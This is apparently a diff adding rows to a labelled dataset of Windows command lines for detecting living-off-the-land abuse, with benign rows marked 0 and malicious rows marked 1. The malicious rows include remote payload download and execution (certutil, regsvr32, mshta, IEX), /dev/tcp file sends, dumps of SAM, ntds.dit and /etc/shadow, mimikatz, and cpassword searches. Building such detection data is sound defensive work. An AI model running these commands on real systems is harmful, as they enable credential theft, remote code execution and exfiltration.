+evntcmd.exe [/s <computername>] [/v <verbositylevel>] [/n] <filename>,0,volttyphoon,286
+wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary',1,combined_lotl,287
+fsianycpu.exe,1,combined_lotl,288
+winword.exe {REMOTEURL},1,combined_lotl,289
+"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""C:\Logs\dfgbcis.txt\"" \""C:\Program Files\Logs\kwwfcgiej.txt\"""" /sc daily /st 23:00",0,combined_lotl,290
+"powershell -Command ""Get-WmiObject -Class Win32_Process -Filter 'name like \""%chrome.exe%\""'""",0,combined_lotl,291
+SQLToolsPS.exe -noprofile -command Start-Process {PATH:.exe},1,combined_lotl,292
+colorcpl {PATH},1,combined_lotl,293
+C:\Windows\System32\net.exe use Z: \\192.168.4.160\data,0,combined_lotl,294
+"icacls.exe ""D:\Users\cenaqnw\Documents\rpkazgvcg.sys"" /grant Everyone:F",0,combined_lotl,295
+"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""D:\Temp\rzjrze.log\"" \""C:\AppData\ymbosb.txt\"""" /sc daily /st 23:00",0,combined_lotl,296
+"D:\Windows\System32\icacls.exe ""D:\Temp\Users\wagorvqmta.dat"" /grant Everyone:F",0,combined_lotl,297
+vsls-agent.exe --agentExtensionPath {PATH_ABSOLUTE:.dll},1,combined_lotl,298
+dtrace [-BCeFhlqSvVwYZ] [-b bufsz] [-c cmd] [-D name[=def]] [-I path],0,combined_lotl,299
+ping.exe 192.168.60.187,0,combined_lotl,300
+winget.exe install --manifest {PATH:.yml},1,combined_lotl,301
+echo g5rVLoWZvd1r > D:\Temp\nawpjg.sys,0,combined_lotl,302
+"""cmd.exe"" /c wmic process call create ""cmd.exe /c mkdir C:\windows\Temp\McAfee_Logs & ntdsutil \""ac i ntds\"" ifm \""create full C:\Windows\Temp\McAfee_Logs\""",1,combined_lotl,303
+ping.exe 192.168.248.247,0,combined_lotl,304
+"type ""D:\Users\ofdxn.exe""",0,combined_lotl,305
+"findstr.exe /i ""warning"" backup.dat",0,combined_lotl,306
+"fsutil.exe file layout ""C:\Users\ysmunmtq.log""",0,combined_lotl,307
+fsutil.exe volume [dismount] D:\Users\auouu\Desktop,0,combined_lotl,308
+"findstr /C:""1fQEpvbNgIFa"" ""C:\Users\mfvul\Pictures\Desktop\iehapm.ini""",0,combined_lotl,309
+replace drive=2,0,combined_lotl,310
+"msiexec /i {PATH_ABSOLUTE:.msi} TRANSFORMS=""{REMOTEURL:.mst}"" /qb",1,combined_lotl,311
+"C:\Windows\copy.exe ""C:\Users\Users\maiouxpkc.sys"" ""C:\Logs\vxyjghnhi.txt""",0,combined_lotl,312
+TestWindowRemoteAgent.exe start -h {your-base64-data}.example.com -p 8000,1,combined_lotl,313
+finger user@example.host.com | more +2 | cmd,1,combined_lotl,314
+regsvr32.exe /s /u /i:{PATH:.sct} scrobj.dll,1,combined_lotl,315
+net user hmnxccnq /add,0,combined_lotl,316
+"certutil -hashfile ""D:\Users\klwtabak\Documents\Desktop\lfbwt.exe"" SHA256",0,combined_lotl,317
+C:\Windows\System32\certutil.exe -decode {PATH:.base64} {PATH},1,combined_lotl,318
+Update.exe --updateRollback={REMOTEURL},1,combined_lotl,319
+"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Users\Users\aejfdkv.sys\"" \""C:\Users\ugqborh\Downloads\qmwflzkqnu.exe\"""" /sc daily /st 23:00",0,combined_lotl,320
+fsutil behavior query {allowextchar | bugcheckoncorrupt | disable8dot3 [<volumepath>] | disablecompression | disablecompressionlimit | disableencryption | disablefilemetadataoptimization | disablelastaccess | disablespotcorruptionhandling | disabletxf | disablewriteautotiering | encryptpagingfile | mftzone | memoryusage | quotanotify | symlinkevaluation | disabledeletenotify},0,combined_lotl,321
+delete partition,0,combined_lotl,322
+"fsutil clfs authenticate ""C:\example_log.blf""",0,combined_lotl,323
+Update.exe --createShortcut={PATH:.exe} -l=Startup,1,combined_lotl,324
+"attrib.exe +h ""C:\Temp\AppData\onvnsstkag.log""",0,combined_lotl,325
+"del ""D:\Users\ztcui\Desktop\Pictures\txwvsx.log"" /f /q",0,combined_lotl,326
+cmstp.exe /ni /s {REMOTEURL:.inf},1,combined_lotl,327
+"icacls.exe ""D:\Users\rnjaj\Documents\Pictures\uvvmfbwr.sys"" /grant Everyone:F",0,combined_lotl,328
+xsd.exe {REMOTEURL},1,combined_lotl,329
+add disk=276 [align=276] [wait] [noerr],0,combined_lotl,330
+net.exe localgroup Administrators knstqtng /add,0,combined_lotl,331
+"del ""D:\Temp\Users\qnvsmr.dll"" /f /q",0,combined_lotl,332
+"E:\Windows\System32\dir.exe ""C:\Users\Temp""",0,combined_lotl,333
+"certutil.exe -hashfile ""D:\Temp\yasfph.log"" SHA256",0,combined_lotl,334
+rem,0,combined_lotl,335
+C:\Windows\System32\netstat.exe -an,0,combined_lotl,336
+"rundll32.exe shell32.dll,ShellExec_RunDLL {PATH:.exe}",1,combined_lotl,337
+dtutil.exe /FILE {PATH_ABSOLUTE:.source.ext} /COPY FILE;{PATH_ABSOLUTE:.dest.ext},1,combined_lotl,338
+"rundll32 ""{PATH}:ADSDLL.dll"",DllMain",1,combined_lotl,339
+"mkdir.exe ""C:\Temp\AppData""",0,combined_lotl,340
+set comspec={PATH_ABSOLUTE:.exe} & cscript c:\windows\system32\manage-bde.wsf,1,combined_lotl,341
+fsi.exe {PATH:.fsscript},1,combined_lotl,342
+"C:\Windows\System32\copy.exe ""C:\AppData\AppData\qgdmk.ini"" ""C:\AppData\Users\akadhmrt.sys""",0,combined_lotl,343
+"findstr.exe /C:""FYAcklC8yZro"" ""C:\Temp\Program Files\ogfdkwb.log""",0,combined_lotl,344
+cmdl32 /vpn /lan %cd%\config,1,combined_lotl,345
+"attrib +h ""D:\Users\nzom\Documents\Documents\dqkxkpxjuq.dll""",0,combined_lotl,346
+"attrib +h ""D:\Logs\jqwdoq.exe""",0,combined_lotl,347
+"del ""D:\Logs\Users\uvrobffq.exe"" /f /q",0,combined_lotl,348
+appcert.exe test -apptype desktop -setuppath {PATH_ABSOLUTE:.msi} -setupcommandline /q -reportoutputpath {PATH_ABSOLUTE:.xml},1,combined_lotl,349
+query.exe user,1,combined_lotl,350
+echo.exe SJeVW5GrsD3C > D:\AppData\lqhkho.sys,0,combined_lotl,351
+msiexec /z {PATH_ABSOLUTE:.dll},1,combined_lotl,352
+regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll,1,combined_lotl,353
+"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""C:\Logs\ediemwbjn.ini\"" \""D:\AppData\Temp\kzeksxci.dll\"""" /sc daily /st 23:00",0,combined_lotl,354
+net.exe use Z: \\192.168.199.210\data,0,combined_lotl,355
+C:\Program Files (x86)\net.exe localgroup Administrators user1 /add,0,combined_lotl,356
+"create lun mirror [size=<n>] [drives=<n, n> [,...]] [stripesize=<n>] [noerr]",0,combined_lotl,357
+"SyncAppvPublishingServer.exe ""n;(New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX""",1,combined_lotl,358
+"echo.exe %DATE% %TIME% >> ""D:\Program Files\rwwwgk.ini""",0,combined_lotl,359
+iscsicpl.exe,1,combined_lotl,360
+"wmic.exe process get brief /format:""{REMOTEURL:.xsl}""",1,combined_lotl,361
+expand {PATH_SMB:.bat} {PATH_ABSOLUTE}:file.bat,1,combined_lotl,362
+certutil.exe -urlcache -f {REMOTEURL:.exe} {PATH:.exe},1,combined_lotl,363
+csi.exe {PATH:.cs},1,combined_lotl,364
+net localgroup Administrators parqhcjq /add,0,combined_lotl,365
+Dxcap.exe -c {PATH_ABSOLUTE:.exe},1,combined_lotl,366
+compact vdisk,0,combined_lotl,367
+"type.exe ""D:\Logs\blowlhgcud.txt""",0,combined_lotl,368
+Gpscript /startup,1,combined_lotl,369
+C:\Program Files (x86)\netstat.exe -an,0,combined_lotl,370
+"del ""D:\Logs\Temp\vgxxdrzrke.dll"" /f /q",0,combined_lotl,371
+"powershell.exe -Command ""Get-ChildItem -Path C:\Users\qbglaci\Downloads\Downloads -Recurse | Select-Object FullName, Length""",0,combined_lotl,372
+freedisk 50mb,0,combined_lotl,373
+net user dbnenwlg /add,0,combined_lotl,374
+regedit /E {PATH_ABSOLUTE}:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey,1,combined_lotl,375
+"findstr /C:""yHCRviF4pKdS"" ""C:\Users\kbkm\Documents\qiqitm.exe""",0,combined_lotl,376
+C:\Windows\fsutil.exe 8dot3name [query] [<volumepath>],0,combined_lotl,377
+create lun automagic size=405 [noerr],0,combined_lotl,378
+ping.exe 192.168.182.125,0,combined_lotl,379
+winfile.exe {PATH:.exe},1,combined_lotl,380
+"echo %DATE% %TIME% >> ""D:\Program Files\Program Files\ajyov.txt""",0,combined_lotl,381
+"findstr.exe /C:""QmRaLbohhTlj"" ""C:\Logs\wdbfbs.ini""",0,combined_lotl,382
+"rmdir ""D:\AppData\Windows"" /s /q",0,combined_lotl,383
+"move ""C:\AppData\Logs\ybsxkjfceg.ini"" ""D:\Logs\Windows\xolwwfc.ini""",0,combined_lotl,384
+"rundll32.exe ieframe.dll,OpenURL {PATH_ABSOLUTE:.url}",1,combined_lotl,385
+"icacls ""C:\Users\aobyzjz\Pictures\Downloads\qfgrzaeecs.dat"" /grant Everyone:F",0,combined_lotl,386
+"echo %DATE% %TIME% >> ""D:\Program Files\Logs\bzfyai.ini""",0,combined_lotl,387
+"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Users\wgjzhir\Documents\ayjacq.dll\"" \""D:\AppData\Program Files\jrszwnw.txt\"""" /sc daily /st 23:00",0,combined_lotl,388
+net.exe user ofzpdcbb /add,0,combined_lotl,389
+"move.exe ""C:\Windows\dbduacf.ini"" ""D:\Temp\Users\ckhmqy.sys""",0,combined_lotl,390
+wsl.exe -u root -e cat /etc/shadow,1,combined_lotl,391
+"fsutil.exe file layout ""D:\AppData\Windows\uipjwmer.txt""",0,combined_lotl,392
+"move ""D:\Users\khpiazs.exe"" ""D:\Users\daeyt\Desktop\amzpsmlxc.txt""",0,combined_lotl,393
+"findstr.exe /C:""6DBuPKved6SP"" ""C:\AppData\uszgrsnt.dll""",0,combined_lotl,394
+net use Z: \\192.168.23.141\data,0,combined_lotl,395
+net.exe user hyuvcopt /add,0,combined_lotl,396
+mshta.exe {PATH:.hta},1,combined_lotl,397
+"icacls.exe ""D:\Logs\Program Files\napmxml.dll"" /grant Everyone:F",0,combined_lotl,398
+net localgroup Administrators qbpcsycp /add,0,combined_lotl,399
+C:\Windows\ping.exe 192.168.194.6,0,combined_lotl,400
+"mshta.exe ""{PATH_ABSOLUTE}:file.hta""",1,combined_lotl,401
+"rundll32.exe zipfldr.dll,RouteTheCall file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e",1,combined_lotl,402
+ping.exe 192.168.243.182,0,combined_lotl,403
+"xbootmgr.exe -trace ""{boot|hibernate|standby|shutdown|rebootCycle}"" -callBack {PATH:.exe}",1,combined_lotl,404
+"findstr /C:""eELkxRo7GX1r"" ""C:\Program Files\Users\fbvzgncg.dll""",0,combined_lotl,405
+"mkdir.exe ""C:\Users\dgrdp\Pictures""",0,combined_lotl,406
+"C:\Windows\type.exe ""C:\Windows\Windows\bojhi.txt""",0,combined_lotl,407
+"fsutil file layout ""D:\Windows\Temp\fmulrdyxfb.exe""",0,combined_lotl,408
+bitsadmin /create 1 bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1,1,combined_lotl,409
+type.exe {PATH_ABSOLUTE} > {PATH_SMB},1,combined_lotl,410
+net user ephymnyn /add,0,combined_lotl,411
+"mkdir ""D:\Users\iwzv\Pictures""",0,combined_lotl,412
+"type ""D:\Program Files\ffwsedgu.exe""",0,combined_lotl,413
+net user udynkeqr /add,0,combined_lotl,414
+"echo %DATE% %TIME% >> ""D:\Users\olfbnq\Downloads\Pictures\olkvitniha.log""",0,combined_lotl,415
+"mkdir.exe ""D:\Logs\Program Files""",0,combined_lotl,416
+net.exe user mguhhgfk /add,0,combined_lotl,417
+"type.exe ""D:\Logs\qxlhbcf.dat""",0,combined_lotl,418
+"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Users\nnunfve\Downloads\miwvqaja.dat\"" \""D:\Logs\Users\bberxdy.dll\"""" /sc daily /st 23:00",0,combined_lotl,419
+"findstr.exe /C:""oYjK8e2HJQnw"" ""D:\Users\upswdcnc\Documents\Pictures\cgpqnasss.txt""",0,combined_lotl,420
+"fsutil.exe file layout ""C:\Users\pggsojkd\Documents\aelmnsfebb.sys""",0,combined_lotl,421
+VSLaunchBrowser.exe .exe {PATH_ABSOLUTE:.exe},1,combined_lotl,422
+"adplus.exe -crash -o ""{PATH_ABSOLUTE:folder}"" -sc {PATH:.exe}",1,combined_lotl,423
+"attrib.exe +h ""C:\Temp\Temp\clnqidf.dll""",0,combined_lotl,424
+"del ""C:\Temp\AppData\gngaip.dat"" /f /q",0,combined_lotl,425
+"move ""D:\AppData\ascwnit.exe"" ""C:\Program Files\Temp\sefutm.sys""",0,combined_lotl,426
+"icacls ""D:\AppData\ywmbhe.dat"" /grant Everyone:F",0,combined_lotl,427
+"move ""C:\Users\tpqg\Desktop\vtveekx.dat"" ""C:\Program Files\AppData\ulihzqvnr.dat""",0,combined_lotl,428
+net user nijelhcf /add,0,combined_lotl,429
+dnscmd.exe dc1.lab.int /config /serverlevelplugindll {PATH_SMB:.dll},1,combined_lotl,430
+echo.exe ovmdj0rHNjwJ > C:\Program Files\zaxwewrhn.dat,0,combined_lotl,431
+"mkdir ""C:\Users\zadmfriv\Documents""",0,combined_lotl,432
+"move.exe ""C:\Users\AppData\pvsvy.ini"" ""D:\Program Files\Temp\rrmtqjdyk.dll""",0,combined_lotl,433
+"findstr /C:""lM6d4Hxj3lEq"" ""D:\Windows\mhnhgpm.ini""",0,combined_lotl,434
+"del ""D:\AppData\Logs\bbzfyqjgy.dll"" /f /q",0,combined_lotl,435
+"dir.exe C:\Users\{REDACTED}\.ssh\known_hosts
+dir.exe C:\users\{REDACTED}\appdata\roaming\Mozilla\firefox\profiles
+mimikatz.exe
+reg.exe query hklm\software\OpenSSH
+reg.exe query hklm\software\OpenSSH\Agent
+reg.exe query hklm\software\realvnc
+reg.exe query hklm\software\realvnc\vncserver
+reg.exe query hklm\software\realvnc\Allusers
+reg.exe query hklm\software\realvnc\Allusers\vncserver
+reg.exe query hkcu\software\{REDACTED}\putty\session
+reg.exe save hklm\sam ss.dat
+reg.exe save hklm\system sy.dat",1,volttyphoon,436
+net.exe user stzlcqpl /add,0,combined_lotl,437
+C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe {REMOTEURL:.zip},1,combined_lotl,438
+icacls.exe backup.dat /grant Everyone:R,0,combined_lotl,439
+net.exe user meoqvglb /add,0,combined_lotl,440
+C:\Program Files\cmd.exe /c dir C:\Temp,0,combined_lotl,441
+"echo %DATE% %TIME% >> ""D:\Logs\Program Files\tuinstsof.log""",0,combined_lotl,442
+bash.exe -c 'cat {PATH:.zip} > /dev/tcp/192.168.1.10/24',1,combined_lotl,443
+regsvcs.exe {PATH:.dll},1,combined_lotl,444
+"icacls.exe ""D:\Users\ewvkm.sys"" /grant Everyone:F",0,combined_lotl,445
+"certutil.exe -hashfile ""D:\Users\abdxpjknxz.log"" SHA256",0,combined_lotl,446
+"fsutil file layout ""C:\Users\ocfrysj\Desktop\Downloads\vlgzk.ini""",0,combined_lotl,447
+"powershell -ep RemoteSigned -f .\Launch-VsDevShell.ps1 -VsInstallationPath ""/../../../../../; {PATH:.exe} ;""",1,combined_lotl,448
+fsutil.exe trace decode,1,combined_lotl,449
+DumpMinitool.exe --file {PATH_ABSOLUTE} --processId 1132 --dumpType Full,1,combined_lotl,450
+"cmd.exe /Q /c wmic.exe process call create ""cmd.exe /c mkdir C:\Windows\Temp\tmp & ntdsutil.exe \""ac i ntds\"" ifm \""create full C:\Windows\Temp\tmp\"" 1> \\127.0.0.1\ADMIN$\ 2>&1",1,volttyphoon,451
+"rmdir %temp%\lolbin /s /q 2>nul & mkdir ""%temp%\lolbin\Windows Media Player"" & copy C:\Windows\System32\calc.exe ""%temp%\lolbin\Windows Media Player\wmpnscfg.exe"" >nul && cmd /V /C ""set ""ProgramW6432=%temp%\lolbin"" && unregmp2.exe /HideWMP""",1,combined_lotl,452
+"devtoolslauncher.exe LaunchForDebug {PATH_ABSOLUTE:.exe} ""{CMD:args}"" test",1,combined_lotl,453
+dotnet.exe {PATH:.dll},1,combined_lotl,454
+filesystems,0,combined_lotl,455
+"icacls ""C:\Temp\Users\bdhctzjstx.exe"" /grant Everyone:F",0,combined_lotl,456
+net.exe use Z: \\192.168.150.9\public,0,combined_lotl,457
+net.exe use Z: \\192.168.21.142\public,0,combined_lotl,458
+"schtasks /create /s targetmachine /tn ""MyTask"" /tr ""{cmd.exe}"" /sc daily",1,combined_lotl,459
+"rundll32.exe shdocvw.dll,OpenURL {PATH_ABSOLUTE:.url}",1,combined_lotl,460
+offline disk,0,combined_lotl,461
+"msedgewebview2.exe --utility-cmd-prefix=""{CMD}""",1,combined_lotl,462
+diskraid /s C:\scripts\ubttnx.txt,0,combined_lotl,463
+finger [-l] [<user>] [@<host>] [...],0,combined_lotl,464
+attrib.exe +r document.txt,0,combined_lotl,465
+"powershell.exe -Command ""Get-ChildItem -Path C:\Users\Users -Recurse | Select-Object FullName, Length""",0,combined_lotl,466
+reenumerate {subsystems | drives},0,combined_lotl,467
+net user oavfhunp /add,0,combined_lotl,468
+"C:\Windows\System32\type.exe ""C:\Logs\Users\gzjgnhds.ini""",0,combined_lotl,469
+echo ygMHmqFd4DBW > D:\Logs\qjmwzp.dat,0,combined_lotl,470
+"del ""C:\Windows\jxqsxzgwvz.dll"" /f /q",0,combined_lotl,471
+ping.exe 192.168.124.205,0,combined_lotl,472
+"copy ""C:\Users\vqert.dat"" ""D:\Temp\otypeypdjs.dat""",0,combined_lotl,473
+C:\Program Files\icacls.exe data.log /grant Everyone:R,0,combined_lotl,474
+shrink [desired=<n>] [minimum=<n>] [nowait] [noerr],0,combined_lotl,475
+"mshta.exe vbscript:Close(Execute(""GetObject(""""script:{REMOTEURL:.sct}"""")""))",1,combined_lotl,476
+"del ""C:\Program Files\Logs\ccorj.log"" /f /q",0,combined_lotl,477
+"C:\Windows\dir.exe ""C:\AppData\Temp""",0,combined_lotl,478
+dnscmd <servername> <command> [<command parameters>],0,combined_lotl,479
+xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /z{REMOTEURL},1,combined_lotl,480
+"attrib.exe +h ""C:\Temp\plszrc.txt""",0,combined_lotl,481
+#End of script,0,combined_lotl,482
+"copy ""C:\Temp\dgjhvoicte.txt"" ""D:\Windows\Logs\frgvxmx.exe""",0,combined_lotl,483
+Version: 1.0.0.7,0,combined_lotl,484
+rdrleakdiag.exe /p 832 /o {PATH_ABSOLUTE:folder} /fullmemdmp /wait 1,1,combined_lotl,485
+net.exe user pynxretv /add,0,combined_lotl,486
+"set ""SYSTEMROOT=C:\Windows\Temp"" && cmd /c desktopimgdownldr.exe /lockscreenurl:{REMOTEURL} /eventName:desktopimgdownldr",1,combined_lotl,487
+"del ""D:\Users\Windows\lugejjxpr.ini"" /f /q",0,combined_lotl,488
+"echo %DATE% %TIME% >> ""C:\Windows\Users\ttnuxtlqu.dll""",0,combined_lotl,489
+"tasklist | findstr ""winlogon.exe""",0,combined_lotl,490
+net localgroup Administrators mgvjolii /add,0,combined_lotl,491
+net.exe user huenavsy /add,0,combined_lotl,492
+"C:\Windows\icacls.exe ""C:\AppData\tolerpv.ini"" /grant Everyone:F",0,combined_lotl,493
+"type.exe ""C:\Windows\iomhkqi.dll""",0,combined_lotl,494
+ping 192.168.75.129,0,combined_lotl,495
+"E:\Windows\certutil.exe -hashfile ""D:\Users\Windows\kuijvxfmj.dll"" SHA256",0,combined_lotl,496
+"rundll32.exe desk.cpl,InstallScreenSaver {PATH_ABSOLUTE:.scr}",1,combined_lotl,497
+"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:{REMOTEURL}"")",1,combined_lotl,498
+"dir.exe ""D:\Program Files\Temp""",0,combined_lotl,499
+"fsutil file layout ""D:\Windows\Program Files\esqknfn.log""",0,combined_lotl,500
+"move.exe ""D:\Windows\Users\jexvmuyerw.sys"" ""C:\Users\shcp\Documents\Desktop\yauissy.dat""",0,combined_lotl,501
+"rundll32.exe ieadvpack.dll,RegisterOCX {PATH:.exe}",1,combined_lotl,502
+"attrib.exe +h ""D:\Users\Logs\pbqalhsp.txt""",0,combined_lotl,503
+delete disk [noerr] [override],0,combined_lotl,504
+echo.exe X5Srj95Q43dn > C:\Windows\Temp\ixenzzm.dll,0,combined_lotl,505
+"schtasks /create /tn ""My Daily Backup"" /tr ""C:\Windows\copy.exe \""D:\Windows\Program Files\sorps.log\"" \""D:\Logs\Windows\svgosul.log\"""" /sc daily /st 23:00",0,combined_lotl,506
+"powershell -Command ""Get-ChildItem -Path C:\Logs\Windows -Recurse | Select-Object FullName, Length""",0,combined_lotl,507
+"copy.exe ""C:\Temp\mxawtje.dll"" ""D:\Temp\Temp\dpwqxakuf.ini""",0,combined_lotl,508
+C:\Windows\System32\net.exe localgroup Administrators ykhqhble /add,0,combined_lotl,509
+netsh.exe add helper {PATH_ABSOLUTE:.dll},1,combined_lotl,510
+rdrleakdiag.exe /p 832 /o {PATH_ABSOLUTE:folder} /fullmemdmp /snap,1,combined_lotl,511
+"sc config {ExistingServiceName} binPath=""\""c:\\ADS\\file.txt:cmd.exe\"" /c echo works > \""c:\ADS\works.txt\"""" & sc start {ExistingServiceName}",1,combined_lotl,512
+"mkdir.exe ""D:\Users\crhnshf\Downloads""",0,combined_lotl,513
+"mkdir.exe ""D:\Users\Logs""",0,combined_lotl,514
+chap initiator remember secret=[yBClNxxGR4Vc4CVr] target=iqn.2025-11.com.example:xfckvlmb,0,combined_lotl,515
+VisualUiaVerifyNative.exe,1,combined_lotl,516
+C:\Program Files\cmd.exe /c dir C:\Program Files,0,combined_lotl,517
+"D:\Windows\fsutil.exe file layout ""C:\Program Files\mxcsabtxtr.txt""",0,combined_lotl,518
+cdb.exe -cf {PATH:.wds} -o notepad.exe,1,combined_lotl,519
+eventvwr.exe,1,combined_lotl,520
+clean [all],0,combined_lotl,521
+"C:\Program Files\powershell.exe -Command ""Get-Process""",0,combined_lotl,522
+"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""C:\AppData\nvojzuvq.ini\"" \""D:\Users\gnrk\Desktop\slojn.dll\"""" /sc daily /st 23:00",0,combined_lotl,523
+"move.exe ""D:\Program Files\habigreqbg.log"" ""D:\Program Files\kgbzqn.sys""",0,combined_lotl,524
+net localgroup Administrators dsjfzprh /add,0,combined_lotl,525
+"mkdir.exe ""D:\Temp\Users""",0,combined_lotl,526
+mspub.exe {REMOTEURL},1,combined_lotl,527
+"C:\Windows\System32\type.exe ""D:\AppData\croykt.ini""",0,combined_lotl,528
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_compiler.exe -v none -p C:\users\cpl.internal\desktop\asptest\ -f C:\users\cpl.internal\desktop\asptest\none -u,1,combined_lotl,529
+"copy.exe ""C:\AppData\Users\asjocarda.ini"" ""C:\AppData\xwxaqdd.dll""",0,combined_lotl,530
+net.exe localgroup Administrators dlbebbbd /add,0,combined_lotl,531
+pcalua.exe -a {PATH:.exe},1,combined_lotl,532
+evntcmd [/s <computername>] [/v <verbositylevel>] [/n] C:\Temp\pdhitofcxo.exe,0,combined_lotl,533
+fsutil.exe wim [enumwims] C,0,combined_lotl,534
+"attrib.exe +h ""C:\Users\tjowh\Documents\Pictures\fhhwi.sys""",0,combined_lotl,535
+uniqueid disk id=5f1b2c36,0,combined_lotl,536
+"dir ""D:\Users\snkhhhr\Documents"" /s /b",0,combined_lotl,537
+net localgroup Administrators spnozkkr /add,0,combined_lotl,538
+"del ""D:\Users\Logs\kfdeqiul.dll"" /f /q",0,combined_lotl,539
+"C:\Windows\System32\fsutil.exe file layout ""C:\Logs\Program Files\zvesqoz.dat""",0,combined_lotl,540
+"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""D:\Users\hsnlmwdl\Downloads\Pictures\xfrci.dll\"" \""D:\Users\voxosi\Pictures\Downloads\jeqwjatn.ini\"""" /sc daily /st 23:00",0,combined_lotl,541
+"fsutil.exe file layout ""C:\Logs\ctmnbmhl.sys""",0,combined_lotl,542
+C:\Windows\net.exe user ajthsbxn /add,0,combined_lotl,543
+net.exe use Z: \\192.168.178.144\backup,0,combined_lotl,544
+Update.exe --removeShortcut={PATH:.exe}-l=Startup,1,combined_lotl,545
+"type.exe ""D:\Users\adxukxxc.log""",0,combined_lotl,546
+"move ""C:\Users\qfdxmcupc.sys"" ""C:\Users\cvcwg.txt""",0,combined_lotl,547
+ping.exe 192.168.61.107,0,combined_lotl,548
+"C:\Windows\System32\fsutil.exe file layout ""C:\Temp\Users\siojrahrt.dll""",0,combined_lotl,549
+C:\Windows\net.exe user afejlnnn /add,0,combined_lotl,550
+create partition,0,combined_lotl,551
+D:\Windows\System32\fsutil.exe volume [querycluster] C:\Logs <cluster> [<cluster>] …,0,combined_lotl,552
+verclsid.exe /S /C {CLSID},1,combined_lotl,553
+VSLaunchBrowser.exe .exe {REMOTEURL:.exe},1,combined_lotl,554
+devinit.exe run -t msi-install -i {REMOTEURL:.msi},1,combined_lotl,555
+msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH},1,combined_lotl,556
+"findstr.exe /C:""2hq8quxVpDpH"" ""D:\Users\slyxa\Documents\wdcyb.txt""",0,combined_lotl,557
+findstr.exe [/b] [/e] [/l | /r] [/s] [/i] [/x] [/v] [/n] [/m] [/o] [/p] [/f:<file>] [/c:ERRORLEVEL] [/g:<file>] [/d:<dirlist>] [/a:<colorattribute>] [/off[line]] <strings> [E:][C:\AppData\AppData]C:\AppData\uzynvyeh.ini[ ...],0,combined_lotl,558
+findstr /S /I cpassword \\sysvol\policies\*.xml,1,combined_lotl,559
+"move ""D:\Users\kebs\Documents\Downloads\hccwb.ini"" ""C:\Users\btblhpav\Downloads\etjelsp.exe""",0,combined_lotl,560
+"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Program Files\jrrbbphug.dat\"" \""D:\Logs\tirjlyz.log\"""" /sc daily /st 23:00",0,combined_lotl,561
+"C:\Program Files (x86)\findstr.exe /i ""error"" config.ini",0,combined_lotl,562
+"echo %DATE% %TIME% >> ""D:\Windows\qjtadfy.exe""",0,combined_lotl,563
+"icacls ""C:\AppData\fqwuaobz.sys"" /grant Everyone:F",0,combined_lotl,564
+xwizard RunWizard /taero /u {00000001-0000-0000-0000-0000FEEDACDC},1,combined_lotl,565
+echo.exe RpoPiLAb0sjQ > D:\Temp\wybavqzv.ini,0,combined_lotl,566
+msiexec /q /i {REMOTEURL},1,combined_lotl,567
+"icacls ""C:\Users\AppData\ojzfetnx.exe"" /grant Everyone:F",0,combined_lotl,568
+"powershell.exe -Command ""Get-ChildItem -Path C:\Program Files\Windows -Recurse | Select-Object FullName, Length""",0,combined_lotl,569
+net.exe localgroup Administrators backup /add,0,combined_lotl,570
+"type ""D:\Windows\dqsxt.exe""",0,combined_lotl,571
+ping.exe 192.168.171.3,0,combined_lotl,572
+"type ""C:\Windows\Windows\gsqgxflao.exe""",0,combined_lotl,573
+"wbadmin start recovery -version:<VERSIONIDENTIFIER> -recoverytarget:{PATH_ABSOLUTE:folder} -itemtype:file -items:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -notRestoreAcl -quiet",1,combined_lotl,574
+esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d {PATH_ABSOLUTE:.dit},1,combined_lotl,575
+diskshadow> exec {PATH:.exe},1,combined_lotl,576
+ping.exe 192.168.154.18,0,combined_lotl,577
+assign letter=e,0,combined_lotl,578
+Microsoft.Workflow.Compiler.exe {PATH} {PATH:.log},1,combined_lotl,579
+ping 192.168.91.3,0,combined_lotl,580
+"mkdir.exe ""C:\Temp\Windows""",0,combined_lotl,581
+net localgroup Administrators qswwnwrv /add,0,combined_lotl,582
+"copy ""D:\Temp\Windows\zwezrkog.exe"" ""C:\Program Files\kddpsztde.sys""",0,combined_lotl,583
+odbcconf -f {PATH:.rsp},1,combined_lotl,584
+"explorer.exe /root,""{PATH_ABSOLUTE:.exe}""",1,combined_lotl,585
+"dir.exe ""D:\Logs\Program Files""",0,combined_lotl,586
+"fsutil file layout ""D:\Logs\hlgpkg.exe""",0,combined_lotl,587
+"copy ""C:\Users\Temp\gbabv.exe"" ""D:\Logs\Windows\efycamdcwd.exe""",0,combined_lotl,588
+"wmic.exe /node:""192.168.0.1"" process call create ""{CMD}""",1,combined_lotl,589
+Update.exe --updateRollback={PATH_SMB:folder},1,combined_lotl,590
+msbuild.exe {PATH:.proj},1,combined_lotl,591
+ping.exe 192.168.191.39,0,combined_lotl,592
+"findstr.exe /C:""Ju6JSCWMM6uo"" ""D:\Program Files\vwxzwsgxpf.dat""",0,combined_lotl,593
+"icacls.exe ""C:\Temp\stzeggwylp.dll"" /grant Everyone:F",0,combined_lotl,594
+echo 4XrIn4StkO4O > D:\Logs\Program Files\yqbfns.exe,0,combined_lotl,595
+stordiag.exe,1,combined_lotl,596
